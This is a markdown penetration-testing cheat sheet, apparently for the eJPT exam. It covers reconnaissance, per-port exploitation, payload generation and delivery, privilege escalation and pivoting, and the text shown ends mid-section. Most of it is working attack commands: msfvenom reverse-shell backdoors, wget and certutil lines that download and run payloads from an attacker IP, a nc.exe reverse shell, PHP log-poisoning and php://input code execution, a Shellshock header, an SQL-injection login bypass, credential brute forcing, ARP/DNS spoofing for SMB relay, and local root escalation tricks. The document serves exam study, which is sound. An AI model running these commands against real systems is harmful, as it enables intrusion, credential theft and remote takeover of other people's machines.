## Quick Index

- Global Strategy
  - [Summary](#summary)
  - [Before the Beginning (48h OODA)](#before-the-beginning)
- Recon & Scanning
  - [Tactical Deployment and Reconnaissance](#tactical-deployment-and-reconnaissance)
  - [Recon troubleshooting (OODA)](#the-ooda-loop-in-the-reconnaissance-phase-troubleshooting)
- Service Playbooks
  - [FTP (21)](#port-21-ftp)
  - [SSH (22)](#port-22-ssh)
  - [SMTP (25)](#port-25-smtp)
  - [HTTP/S (80/443)](#port-80443-https)
  - [SMB (139/445)](#port-139445-smb)
  - [MSSQL (1433)](#port-1433-mssql)
  - [MySQL (3306)](#port-3306-mysql)
  - [WinRM (5985)](#port-5985-winrm)
- Payloads
  - [MSFVenom generation](#msfvenom-payloads-generation)
  - [Built-in payloads on Kali](#built-in-payloads-on-kali)
  - [Delivery (HTTP/SMB/FTP)](#payload-delivery)
  - [Payload troubleshooting (OODA)](#the-ooda-loop-in-the-exploitation-phase-troubleshooting)
- Post-Exploitation
  - [Primary triage](#primary-triage)
  - [PrivEsc: Linux](#privilege-escalation-execution)
  - [PrivEsc: Windows](#privilege-escalation-execution)
  - [Post-exploitation OODA](#the-ooda-loop-in-the-post-exploitation-phase)
- Pivoting
  - [Scenario 1: Metasploit internal modules](#scenario-1-utilise-metasploits-internal-modules)
  - [Scenario 2: Kali external tools](#scenario-2-utilise-kalis-external-tools)
  - [Pivoting troubleshooting (OODA)](#the-ooda-loop-in-the-pivoting-phase)

# Summary
This strategic guide provides mandatory protocols for the exam's unique constraints and uses OODA-based troubleshooting loops to follow best-practice operations and overcome common "stuck" points in reconnaissance, exploitation, and pivoting.

# Before the Beginning

This section provides a high-level OODA loop to guide the entire 48-hour examination.

- Observe (Observe the battlefield) — first 30 minutes
  - Read all 35 questions
  - Read and comprehend the core table (minimum pass mark)
  - Read and internalize the examination constraints (no internet access, dynamic Flags)

- Orient (Adjust mindset) — most critical strategic step
  - The exam is not a "pwn-all-machines" CTF. It is a "document-all-findings" audit.
  - Meticulous enumeration and documentation outweigh exploitation.

- Decide (Establish Engagement Rules)
  - Follow a problem-driven attack model. These 35 issues form the map.
  - Adopt a dual-brain strategy and flag submission protocol as mandatory, inviolable rules.
  - Do not become bogged down on a single exploit for more than 30 minutes. Pivot to alternative targets, gathering additional assessment score points which (with a minimum threshold of 90%) hold greater value than exploitation (minimum threshold of 70%).

- Act (Execution)
  - Enter the second phase (tactical setup and reconnaissance) with this reinforced, resilient mindset.

| Domain                        | Weight | Key Skills                                                                                                                    | Minimum Score |
| ----------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------- | ------------- |
| Assessment Methodologies      | 25%    | Host discovery (`nmap -sn`), port/service/OS identification (`nmap -sV -sC -O`), vulnerability identification (`searchsploit`) | 90%           |
| Host & Network Auditing       | 25%    | System/user enumeration, credential dumping, file transfer                                                                    | 80%           |
| Host & Network Penetration    | 35%    | Exploitation (Metasploit Framework), brute force (hydra), pivoting                                                            | 70%           |
| Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |

# Tactical Deployment and Reconnaissance

## Metasploit Framework Initiation and Verification Workflow

[Back to Index](#quick-index)

The Metasploit database serves as the core strategic tool for managing operational cognitive load.

```bash
service postgresql start && msfconsole
msf6 > db_status
msf6 > workspace -a lab
```

## Network and Service Reconnaissance

[Back to Index](#quick-index)

The objective at this stage is to construct a comprehensive map of the network.

### Host Discovery

```bash
nmap -sn <target_ip_range>
```

### Service and Port Scanning

```bash
nmap -sV -sC -O -p- <target_ip> -oX v_<target_ip>.xml
nmap -sU -sV -p 53,69,161,134 <target_ip>
```

### Import Nmap Results into Metasploit

```text
msf6 > db_import v_<target_ip>.xml
msf6 > hosts
msf6 > setg RHOSTS <target_ip>
msf6 > setg RHOST <target_ip>
```

## The OODA Loop in the Reconnaissance Phase (Troubleshooting)

[Back to Index](#quick-index)

### Issue 1 Scanning Failed

- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sV` scan indicates all ports are "filtered".
- Decide (Determine Diagnostic Action):
  1. Re-Orient (Tool Failure): `nmap -sn` (ICMP Ping) is frequently blocked by firewalls. `nmap -sV` (default SYN scan) may also be blocked.
  2. Re-Decide (Switch Tools)
- Act:
  1. Use `sudo arp-scan -I eth0 <RANGE>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
  2. For port scanning, switch to a full TCP Connect scan: `nmap -sT -Pn <target_ip>`. `-sT` is noisier but more reliable against simple firewalls. `-Pn` skips (potentially failing) host discovery pings.
- Re-Orient (Self-Check): Is your own machine configured correctly? Check `ip a` on Kali. Are you on the correct VPN interface (`tun0`)? Are you scanning the correct subnet?

# Attack Playbook (Enumeration and Exploitation)

## Port 21: FTP

[Back to Index](#quick-index)

USE: When anonymous login allows write or vulnerable banners are present (vsftpd 2.3.4, ProFTPD 1.3.3c); fallback to brute force when needed.
TAGS: ftp, anonymous, write, put, vsftpd, proftpd, hydra

### Scan

```bash
nmap -sV -p 21 --script=ftp-anon <target_ip>
```

### Manual Enumeration

```bash
ftp <target_ip>
```
- Use `anonymous` as username and empty password to log in.

### MSF Enumeration

```text
msf6 > use auxiliary/scanner/ftp/anonymous
```

### Exploitation

- If Nmap results indicate "Anonymous FTP login permitted" with write access (WA WRITE), proceed immediately to payload delivery using `put shell.exe`.
- If banner = `vsftpd 2.3.4`:
  ```text
  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
  ```
- If banner = `ProFTPD 1.3.3c`:
  ```text
  msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ftp://<target_ip>
  ```

## Port 22: SSH

[Back to Index](#quick-index)

USE: Check for libssh bypass; otherwise consider brute force with known user lists.
TAGS: ssh, libssh, hydra, brute

### Scan

```bash
nmap -sV -p 22 --script=ssh-auth-methods <target_ip>
```

### Manual Enumeration

```bash
nc -nv <target_ip> 22
```

### Exploitation

- If banner contains `libssh`:
  ```text
  msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ssh://<target_ip>
  ```
## Port 25: SMTP

[Back to Index](#quick-index)

USE: Enumerate users with smtp-enum; exploit vulnerable versions like Haraka; brute force credentials.
TAGS: smtp, haraka, hydra, brute

### Scan

```bash
nmap -sV -p 25 --script=smtp-commands <target_ip>
```

### Auto Enumeration

```text
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 > use auxiliary/scanner/smtp/smtp_enum
```
### Exploitation

- If the service is Haraka with versions before 2.8.9, run:
```text
msf6 > use exploit/unix/smtp/haraka_exec
```

### Brute Force

```bash
hydra  -L <user_file> -P <password_file> smtp://<target_ip> -s 587 -m AUTH=LOGIN
```

## Port 80/443: HTTP/S

[Back to Index](#quick-index)

USE: Enumerate web technologies, directories, and application-specific vulnerabilities (CMS, LFI, RCE); exploit misconfigurations or known CVEs.
TAGS: http, https, web, whatweb, gobuster, wpscan, lfi, rce, shellshock, webdav, hydra

### Primary Triage

```bash
nmap -sV -p 80,443 --script=http-title,http-headers,http-server-header,http-methods,http-security-headers,http-robots.txt,http-enum <target_ip>

whatweb -v -a <target_ip>

gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
```
> Use web browser to view and observe the website is also cirtical to help find potential attack vectors

### Enumeration

- If WordPress is detected, run a WordPress scan

    ```bash
    wpscan --url http://<target_ip> --enumerate u,p,t,vp
    ```
    - Options reference:
        - `--url <URL>`: Target URL
        - `--enumerate p`: Enumerate popular plugins
        - `--enumerate ap`: Enumerate all plugins (takes considerable time)
        - `--enumerate t`: Enumerate popular themes
        - `--enumerate at`: Enumerate all themes
        - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)

- If directory enumeration results contains page with code 401, check if there's HTTP Basic Auth

    ```bash
    nmap -p 80,443 --script=http-auth,http-auth-finder <target_ip>
    ```

- If cgi is identified to be used, verify if it's vulnerable:

    ```bash
    nmap -sV -p 80,443 --script=http-shellshock --script-args uri=<cgi_page> <target_ip>
    ```

- If WebDav is identified to be used, do further verification

    ```bash
    nmap -sV -p 80,443 --script=http-webdav-scan # Confirm that WebDav is enabled
    curl -X OPTIONS http://<target_ip>/webdav # Check options allowed
    davtest -url http://<target_ip>/webdav # Test file upload
    ```

    > Usually, file upload through WebDav requires a valid credential, which might need to conduct brute force attack or find leaked credentials from other places

- If PHP is used, find a .php endpoint with at least one query parameter OR the certain page is dynamic (such as index.php), proceed to parameter discovery:
    ```bash
    wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 --hl 100 "http://<target_ip>/<target_php>?FUZZ=test"
    ```
    The testing returns usable parameters, such as `page`. Do further testing based on them.
    1. Test path traversal: Determine if the parameter allows reading arbitrary files.
      ```bash
      curl "http://<target_ip>/<target_php>?<parameter>=../../../../etc/passwd" # Linux Based Server
      curl "http://<target_ip>/<target_php>?=../../../../windows/win.ini"  # Windows Based Server
      ```

      - Path Traversal Payload Reference

      | Target File                           | OS      | Objective                                 |
      | ------------------------------------- | ------- | ----------------------------------------- |
      | /etc/passwd                           | Linux   | User Enumeration & Confirm LFI            |
      | /proc/version                         | Linux   | Kernel & GCC Version Enumeration          |
      | /etc/hosts                            | Linux   | Internal Network Discovery                |
      | C:\Windows\win.ini                    | Windows | Confirm Windows OS & LFI                  |
      | C:\boot.ini                           | Windows | Old Version Windows Initial Configuration |
      | C:\Windows\System32\drivers\etc\hosts | Windows | Internal Network Resolve Record           |

    2. Enumeration for RCE Pre-requisites: Once LFI is confirmed, check for RCE possibilities immediately.
      - Check allow_url_include via Wrappers. Check if the server allows execution of input streams (quickest RCE).
        Send a POST request.
        
        ```bash
        curl -X POST -d "<?php system('whoami');?>" "http://<target_ip>/<target_php>?<parameter>=php://input"
        ```

        If command output is returned, allow_url_include is ON.
      - Locate Log Files (For Log Poisoning). Attempt to read standard log paths to confirm read access and path location. 

      ```bash
      curl "http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log" # Debian/Ubuntu Apache
      curl "http://<target_ip>/index.php?page=../../../../var/log/httpd/access_log" # CentOS/RHEL Apache
      curl "http://192.168.1.105/index.php?page=../../../../var/log/access.log" # Lgecy versiosn Apache
      curl "http://target/index.php?page=../../../../xampp/apache/logs/access.log" # Windows XAMPP
      ```

### Exploitation

- If Banner = "HTTP File Server 2.3x" 
    ```text
    msf6 > use exploit/windows/http/rejetto_hfs_exec
    ```

- If Banner = "BadBlue 2.72b"
    ```text
    msf6 > use exploit/windows/http/badblue_passthru
    ```

- If confirm the server is using Tomcat and obtain Tomcat Management Credentials
    ```text
    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass 
    ```

- If identified WordPress plugin Duplicator version 1.3.24-1.3.26, run
    ```text
    msf6 > use auxiliary/scanner/http/wp_duplicator_file_read
    ```

- If cgi is used and vulerable, 
    ```bash
    curl http://<target_ip>/<cgi_page> -H "User-Agent: () { :;}; echo; echo 'Content-Type: text/plain'; echo; /bin/bash -c '<command>'"
    ```

- If WebDav allows anonymous file upload, or allow file upload and a valid credential obtained, upload a webshell into it
    ```bash
    curl -i -T <webshell_path> http://<target_ip>/webdav -u <username>:<password> 
    ```

- If XODA 0.4.5 identified and the OS is linux/Unix, run
    ```text
    msf6 > use exploit/unix/webapp/xoda_file_upload
    ```

- If Tomcat is identified (get a banner or open port is 8080), run
    ```text
    msf6 > use auxiliary/scanner/http/tomcat_mgr_login # Brute force
    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass # Need creds
    ```

- If a directory allowing uploading identified, try uploading webshell and execute it manually

- If RCE entry point identified, 
  1. Vector 1: PHP Wrappers (If allow_url_include=On)
    ```bash
    curl -X POST -d "<?php system('whoami');?>" "http://<target_ip>/<target_php>?<parameter>=php://input"
    ```
  2. Vector 2: Log Poisoning (If Wrapper fails) 
    Inject PHP code into a log file (via User-Agent) and include the log file to execute it.
    - Poisoning Phase: Send a request with a malicious User-Agent. Do NOT inject into the URL to avoid URL-encoding issues.
      ```bash
      curl -A "<?php system(\$_GET['cmd']);?>" http://<target_ip>/<target_php>
      ```
    - Execution Phase: Include the log file and pass the command.
      ```text
      http://<target_ip>/<target_php>?<parameter>=../../../../var/log/apache2/access.log&cmd=id
      ```

### Brute Force

- If a login page is identified:
  1. Try default credentials.
  2. Try SQL Injection to bypass authentication.
    ```text
    ' OR '1'='1
    ```
  3. Conduct a brute-force attack:
```bash
hydra -L <username_file> -P <password_file> <target_ip> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>" # Brute Force Login Page

hydra -L <username_file> -P <password_file> <target_ip> http-get <auth_path> # Brute Force HTTP Basic Auth
```

- Parameter Description
    - `username` and `password` is the value name defined by web application, and they can be various in different website, e.g. some sites use `user` and `password`.
    -  `^USER^` and `^PASS^`: Hydra placeholders.
    - `F=<failed_message>`: `F=` specifies the distinctive string returned on the page following a failed login.


## Port 139/445: SMB

[Back to Index](#quick-index)

USE: Enumerate shares/users; exploit anonymous write or version-specific vulns; psexec on admin creds.
TAGS: smb, smbclient, smbmap, enum4linux, psexec, hydra

### Scan

```bash
nmap -p 139,445 --script=smb-security-mode,smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
```

### Automatic Enumeration

```bash
enum4linux -a <target_ip>
```

- Options reference:
    - `-a`: Run all enumerations (legacy).
    - `-U`: Enumerate users.
    - `-S`: Enumerate shares.
    - `-G`: Enumerate groups and members.
    - `-r`: RID cycling (used to find users).

### Manual Enumeration

```bash
smbmap -H <target_ip>: (Empty session) # List shares and permissions.
smbmap -H <target_ip> -u <user> -p <pass> # List shares and permissions using credentials。
smbmap -H <target_ip> -r <share> # Recursively list shared memory
```

### Exploitation

- If smb enumshares detects anonymous writable shares (ANON WRITE) 

    ```bash
    smbclient //<target_ip>/<ShareName> -N
    put shell.exe
    ```

- If Banner = "Samba 3.5.0-4.6.4" and have a writable share

    ```text
    msf6 > use exploit/linux/samba/is_knwon_pipename
    ```

- If brute force attack succeed (admin user only)

    ```text
    msf6 > use exploit/windows/smb/psexec
    ```

- If brute force attack succeed (but not admin user)

    ```bash
    smbclient //<target_ip>/<ShareName> -U 'username%password'
    put shell.exe
    ```
- If see the info `Message signing enabled but not required` in scan and enum, burte for and other attack method failed, and gain access to the internet, try SMB Relay Attack
 1. Configure Relay Module
  ```text
  msf6 > use exploit/windows/smb/smb_relay
  ```
  2. Conduct DNS Spoofing
    ```bash
    echo "<attack_ip> *.example.com" > /tmp/hosts
    dnsspoof -i <interface> -f /tmp/hosts
    ```
  3. Conduct ARP Spoofing
    ```bash
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i <interface> -t <victim_IP> <gateway_IP>
    arpspoof -i <interface> -t <gateway_IP> <victim_IP>
    ```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> smb
```
## Port 1433: MSSQL

[Back to Index](#quick-index)

USE: Enumerate version and attempt default or weak credentials; execute commands via xp_cmdshell/mssql_exec upon access.
TAGS: mssql, ms-sql, hydra, metasploit, brute

### Scan

```bash
nmap -sV -p 1433 --script=ms-sql-info,ms-sql-empty-password <target_ip>
```

### Enumeration
- Basic Enumeration

  ```text
  msf6 > use auxiliary/scanner/mssql/mssql_ping
  ```
- Enumeration with Valid Credential

  ```text
  msf6 > use auxiliary/admin/mssql/mssql_enum
  msf6 > use auxiliary/admin/mssql/mssql_sql
  ```

### Brute Force

```text
msf6 > use auxiliary/scanner/mssql/mssql_login
```

### Exploitation

- If get a session through `mssql_login`, run
  ```text
  msf6 > use auxiliary/admin/mssql/mssql_exec
  ```
  This module can be used to execute CMD for local enumeration and payload uploading and execution.

## Port 3306: MySQL

[Back to Index](#quick-index)

USE: Confirm service, then attempt credential brute force.
TAGS: mysql, hydra, db, brute

### Scan

```bash
nmap -sV -p 3306 --script mysql-info <target_ip>
```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> mysql
```

## Port 5985: WinRM

[Back to Index](#quick-index)

USE: Enumerate authentication methods; with valid credentials, obtain a shell via WinRM; fallback to brute force.
TAGS: winrm, evil-winrm, metasploit, brute

### Scan

```bash
nmap -p 5985 -sV <target_ip>
```

### Enumeration

```text
msf6 > use auxiliary/scanner/winrm/winrm_auth_methods
```

### Brute Force

```text
msf6 > use auxiliary/scanner/winrm/winrm_login
```

## Payload Generation and Delivery

[Back to Index](#quick-index)

### MSFVenom Payloads Generation

[Back to Index](#quick-index)

TAGS: msfvenom, payload, windows, linux, reverse_tcp, stageless

- Linux (ELF)
  ```bash
  msfvenom -p linux/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
  ```
- Windows (EXE)
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f exe -o backdoor.exe
  ```

### Built-in Payloads on Kali

[Back to Index](#quick-index)

TAGS: webshell, php, aspx, jsp, nc.exe, windows-resources

Kali ships ready-to-use web shells and binaries under /usr/share. Below are the most exam-relevant items.

#### Web Shells

- PHP reverse shell
  - Path: `/usr/share/webshells/php/php-reverse-shell.php`
  - OODA:
    - Observe: PHP web server; file upload found.
    - Orient: Reverse shell needed (outbound usually allowed).
    - Decide: Use bundled php-reverse-shell.php.
    - Act:
      1. Copy this file.
      2. Edit the file: set ip and port variables to your Kali IP (LHOST) and listening port (LPORT).
      3. Upload the modified file.
      4. Start listener on Kali: `nc -lvnp <LPORT>` or use the Metasploit `/multi/handler` module.
      5. Browse to the uploaded PHP file to trigger the shell.

- ASPX command shell
  - Path: `/usr/share/webshells/aspx/cmdasp.aspx`
  - OODA:
    - Observe: IIS/.aspx; file upload exists.
    - Orient: Simple HTTP web shell is often more reliable than reverse shell.
    - Decide: Upload cmdasp.aspx for initial exec.
    - Act:
      1. Upload.
      2. Browse to it.
      3. Run commands: `http://<target_ip>/uploads/cmdasp.aspx?cmd=whoami`.
      4. Use foothold to fetch a more robust shell.

- JSP reverse shell
  - Path: `/usr/share/webshells/jsp/jsp-reverse.jsp`
  - OODA:
    - Observe: Tomcat/Java service; upload or manager creds.
    - Orient: Deploy a WAR containing the JSP shell.
    - Decide: Package and deploy JSP shell.
    - Act:
      1. Modify `jsp-reverse.jsp` with LHOST and LPORT.
      2. Create a directory (e.g., `shell/`) and place the JSP inside it.
      3. Package as WAR:
         - `jar -cvf shell.war -C shell .`
         - or `zip -r shell.war shell/`
      4. Deploy `shell.war` via the Tomcat Manager console.
      5. Start a listener on Kali: `nc -lvnp <LPORT>`.
      6. Open `http://<target_ip>/shell/jsp-reverse.jsp` to trigger the shell.

#### Windows Binaries

- Netcat (nc.exe)
  - Path: `/usr/share/windows-resources/binaries/nc.exe`
  - OODA:
    - Observe: Have RCE but no interactive shell.
    - Orient: nc.exe supports `-e` to attach cmd.exe.
    - Decide: Use nc.exe for a reverse shell.
    - Act:
      1. Serve file (e.g., `python3 -m http.server`).
      2. Start listener: `nc -lvnp <port>` (or Metasploit multi/handler).
      3. Execute on target: `C:\\Windows\\Temp\\nc.exe <attack_ip> <port> -e cmd.exe`.

### Payload Delivery

[Back to Index](#quick-index)

TAGS: delivery, http, smb, ftp, certutil, wget, python-http-server

- HTTP server on attacker
  ```bash
  python3 -m http.server 8080
  ```
- Linux victim: download + execute
  ```bash
  wget http://<attack_ip>/backdoor.elf -O /tmp/backdoor.elf && chmod +x /tmp/backdoor.elf && /tmp/backdoor.elf
  ```
- Windows victim: download + execute
  ```cmd
  certutil -urlcache -split -f http://<attack_ip>/backdoor.exe C:\\Windows\\Temp\\backdoor.exe && C:\\Windows\\Temp\\backdoor.exe
  ```
- Via SMB
  ```bash
  smbclient //<target_ip>/<ShareName> -N
  put backdoor.exe
  # or
  smbclient //<target_ip>/<ShareName> -U 'username%password'
  put backdoor.exe
  ```
- Via FTP
  ```bash
  ftp <target_ip>
  binary
  put backdoor.exe
  ```

## The OODA Loop in the Exploitation Phase (Troubleshooting)

[Back to Index](#quick-index)

> Tip: When in doubt: switch to stageless, default to x86, and try reverse ports 80/443 before considering bind shells.

### Issue 1 Payload Failed

- Step 1: Staged vs. stageless
  - Staged (…/meterpreter/reverse_tcp): small loader then downloads stage; needs two connections.
  - Stageless (…/meterpreter_reverse_tcp): self-contained; one connection.
  - If staged fails, switch to stageless first.

- Step 2: Architecture (x64 vs. x86)
  - Detect: Windows: `systeminfo | findstr /C:"System Type"`; Linux: `uname -m`.
  - Rule: x86 payload runs on x64; x64 payload will not run on x86.
  - Errors like “exec format error”/“Not a valid Win32 application” imply mismatch. Default to x86 unless you need x64.

- Step 3: Connection type (reverse vs. bind)
  - Default: reverse shell. If LPORT 4444 fails, try `80`, then `443`.
  - Consider bind shell only if outbound is blocked and an inbound port is reachable.

- Step 4: Meterpreter vs. standard shell
  - If Meterpreter dies/stalls, switch to standard shell for stability:
    ```text
    msf6 > set PAYLOAD windows/shell_reverse_tcp
    msf6 > exploit
    ```
  - Upgrade later if needed:
    ```text
    msf6 > background
    msf6 > use post/multi/manage/shell_to_meterpreter
    msf6 > set SESSION 1
    msf6 > run
    ```

This uses the stable shell (Session 1) to upload and run a new Meterpreter payload, yielding a fresh Meterpreter session (Session 2) with higher reliability.

### Issue 2 Cannot Find Vulnerable Component

- Orient: Exploiting vulnerabilities (e.g., `vsftpd_234_backdoor`)
- Decide
  - Re-Orient (Banner Information): ‘Did I genuinely read Nmap's banner, or am I guessing?
  - Re-Orient (Question): ‘Have I misread the exam question?’ The question might not concern this service at all.
  - Decide (Abandon): This isn't CTF. The exam runs for 48 hours. Don't waste two hours on a failed exploit.
- Act: Halt. Shift focus to another open port on the same machine. Alternatively, move to an entirely different machine. Maybe return later.

# Post Exploitation

The superiority of manual enumeration: Regardless, the manually curated enumeration lists within this handbook remain the preferred approach. They are precise, targeted, and directly map to known privilege escalation vectors within eJPT. During examinations, executing these 10-15 manual commands typically proves more efficient than sifting through automated script outputs.

## Primary Triage

[Back to Index](#quick-index)

The first set of commands after obtaining any shell:

- Who am i?
  - Linux: `id`
  - Windows: `whoami /priv` (Key: Verify SeImpersonatePrivilege)
- Where am i? (System)
  - Linux: `uname -a`, `cat /etc/*release*`, `lscpu`
  - Windows: `systeminfo`
- Where am i (Network)
  - Linux: `ip a` (check for a second NIC)
  - Windows: `ipconfig /all` (check for a second NIC)
  - If a second NIC is detected (e.g., on the `10.x.x.x` subnet), immediately trigger Pivoting.
- Who else is here? (System)
  - Linux: `cat /etc/passwd | grep -v nologin`, `lastlog`
  - Windows: `net user`, `net localgroup`, `net localgroup administrators`
- Who else is here? (Network)
  - Linux: `netstat -antup`, `route`, `arp`, `cat /etc/hosts`, `cat /etc/resolv.conf`
  - Windows: `netstat -ano`, `net share`, `ifconfig /displaydns`, `route print`, `arp /a`
- What is running:
  - Linux: `ps aux`, `ls -la /etc/cron*`
  - Windows: `tasklist /svc`, `schtask /query /fo list`, `qfe list`

And there are Metasploit modules can help us do the primary triage:

- `post/windows/gather/checkvm`
- `post/windows/gather/enum_applications`
- `post/windows/gather/enum_logged_on_users`
- `post/linux/gather/enum_configs`
- `post/linux/gather/enum_system`

Automatical Enumeration Tools:
- Windows: JAWS
- Linux: LinEnum

## Privilege Escalation Execution

[Back to Index](#quick-index)

### Linux

- SUDO Abuse
  - Observe: Run `sudo -l` show `ALL) NOPASSWD: <process>`
  - Act: Check `GTFOBins` for exuction
- SUID Abuse:
  - Observce: Run `find / -user root -perm -u=s -type f 2>dev/null` show `<process>`
  - Act: Check `GTFOBins` for exuction
- SUID Path Hijacking
  - Observce: Run `find / -user root -perm -u=s -type f 2>dev/null` show an uncommon and unstanderd customised `<process>`
  - Analysis: Run `string <customised_binary>` and find it invoked a command without an absolute path.
  - Hijack:
  ```bash
  cat > /tmp/<invoked_command> <<'EOF'
  #!/bin/bash
  /bin/bash -p
  EOF
  chmod +x /tmp/<invoked_command>
  export PATH=/tmp:$PATH
  .<customized_binart>
  ```
- Writable `/etc/shadow`
  - Observe: Run `ls -l /etc/shadow` show the user have write permission to the file
  - Act:
    ```bash
      openssl passwd -1 -salt new "new_password`
      vim /etc/shadow   # add the new hash into the file
      su root # enter your new password
    ```

### Windows

- Meterpreter Command
  - Observe: a Meterpreter session has been established
  - Act:
    ```text
    meterpreter > migrate -N explorer.exe
    meterpreter > getsystem
    ```

- AlwaysInstallElevated
  - Observe: query the follow registry keys and found both value are 1
    ```text
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
  - Act:
    Generate `msi` payload with `msfvenom`, upload it into the target machine and set up a listenner/handler, and execute it.

- Unquoted Service Paths
  - Observe: find unquoted service's path when do local enumeration
  - Act:
    1. Generate a payload with naming as `Program.exe` using `msfvenom` and upload it into `C:\` the target machine.
    ```bash
    msfvenom -p windows/x64/exec CMD="cmd.exe" -f exe -o C:\Program.exe
    ```
    2. Restart the vaulnerable service
    ```cmd
    sc stop <vulnerable_service>
    sc start <vulnerable_service>
    ```

- UAC Bypass
  - Observe: find the current account is in the administrators group but `getsystem` command failed
  - Act: Use `exploit/windows/local/bypassuac_injection` module to escalate permission

- File Permission Abuse
  - Observe: The target file or directory belongs to SYSTEM or an administrator, but the ACL configuration permits you to modify permissions. Current account possess standard user privileges, yet can execute takeown and icacls (typically available in the default Windows environment).
  - Act:
    ```cmd
    C:\> takeown /f C:\Windows\System32\<vulnerable_binary>
    C:\> icacls C:\Windows\System32\<vulnerable_binary> /grant <current_account>:F
    copy C:\Windows\System32\cmd.exe C:\Windows\System32\<vulnerable_binary>
    ```

- SeImpersonate
  - Oberse: find current account have `SeImpersonatePrivilege` permission
  - Act:
  ```text
  meterpreter > load incognito
  meterpreter > list tokens -u
  meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
  ```

### Crack Hashed Password

  ```bash
  john --wordlist=<wordlist> hashes.txt --format=<format>
  hashcat -m <hash_type_ode> hashes.txt <wordlist>
  ```
> Using `hashid` command can help identify hash type

## The OODA Loop in The Post Exploitation Phase

[Back to Index](#quick-index)

- Observe: This constitutes the 5-minute Triage.
- Orient: This is the critical decision fork. The focus is not merely on privilege escalation, but on identifying the next highest-value step. Triage data presents multiple paths:
  - Path A (Pivot): `ip a` / `ipconfig` reveals a new, internal NIC (e.g., `$10.x.x.x`).
  - Path B (Simple Privilege Escalation): `whoami /priv` shows `$SeImpersonatePrivilege` or `sudo -l` displays `$(ALL) NOPASSWD:`.
  - Path C (Local Enumeration): `$netstat$` reveals a service listening on `$127.0.0.1$` (e.g., MySQL).
  - Path D (Difficult Privilege Escalation): The sole viable route involves a complex kernel-based or service-abuse vector.
- Decide (Decision: Expert Priority Framework):
  - Core Logic: 35 questions distributed across multiple machines. Unlocking a new subnet (Path A) holds greater value than achieving $root$ on the current machine (Path B/D).
  - Rationale: Path A (Pivoting) may unlock 5 new targets and 10 new questions. Path B (PrivEsc) may only resolve 1-2 issues on this single machine. Pivoting's return on investment (ROI) is almost invariably superior.
  - New Decision Priority List:
    1. Priority 1: PIVOTING (Lateral Movement). Did $ip a$ Triage 1 discover a new subnet?
    - DECIDE: Proceed immediately to Pivoting. Do not attempt $root$ first.
    2. Priority 2: AUDITING.
    - DECIDE: Run a complete manual enumeration checklist (Core Tables 4 & 5) 1. Copy/paste all outputs to local notes. This ensures 80% audit domain score.
    3. Priority 3: EASY PRIVESC (Simple Privilege Escalation). Is there a 1-minute escalation vector (Path B)?
    - DECIDE: Execute it ($sudo vim$, $impersonate token$). After gaining $root$, rerun the audit script with $root$ privileges.
    4. Priority 4: HARD PRIVESC (Difficult Privilege Escalation). Is the sole path complex privilege escalation (Path D)?
    - DECIDE: Cease. Do not go down this rabbit hole. Your time would be better spent on other machines.

# Pivoting and Lateral Movement

USE: When a foothold shows dual NICs; route traffic to internal subnets or relay shells back.
TAGS: pivot, autoroute, socks, proxychains, portfwd, bind_tcp, reverse_tcp

Pivoting/lateral movement is the most challenging aspect of eJPT v2 and the stage where the highest number of candidates encounter failure.

**Trigger**: Execute commands `ipconfig` (Windows) or `ipa` (Linux) on the initial shell (‘PivotBox’) during Local Enumeration/Discovery.

**Observation**: Two NICs detected - one in the DMZ (e.g., `192.168.1.10`), the other on the internal network (e.g. `10.1.13.5`).

**Objective**: Now attack the `10.1.13.0/24` subnet via the PivotBox shell.

**Decision Point**: To utilise Metasploit's internal modules or Kali's external tools?

## Scenario 1. Utilise Metasploit's Internal Modules

[Back to Index](#quick-index)

- Tool: `autoroute`
- Workflow:
  ```text
  meterpreter > run autoroute -s <target_subnet>
  meterpreter > run autoroute -p
  meterpreter > background
  msf6 > use auxiliary/scanner/portscan/tcp
  msf6 > set RHOSTS <target_subnet>
  msf6 > run
  ```

## Scenario 2. Utilise Kali's External Tools

[Back to Index](#quick-index)

- Tool: SocksProxy + Proxychains
- Workflow:
  - Check Proxychains configuration
    ```bash
    cat /etc/proxychains4.conf # socks4 127.0.0.1:9050 can be found by default
  - Set msfconsole
    ```text
    msf6 > use auxiliary/server/socks_proxy
    msf6 > set SRVHOST 127.0.0.1
    msf6 > set SRVPORT 9050
    msf6 > set VERSION 4a
    msf6 > run -j
    ```
  - Execution
    ```bash
    proxychains <tools_command>
    ```

- Tool: `portfwd`
- Workflow:
  - Add port forwarding in Meterpreter
    ```text
    meterpreter > portfwd add -l <local_port>> -p <target_port>> -r <target_ip>
    ```
  - Execution
    ```bash
    <tool_command> # in the command use 127.0.0.1 as IP and <local_port> as Target Port

## The OODA Loop in the Pivoting Phase

[Back to Index](#quick-index)

### Issue 1 Proxychains Failed

- Orient: The `proxychains nmap` command hangs or fails
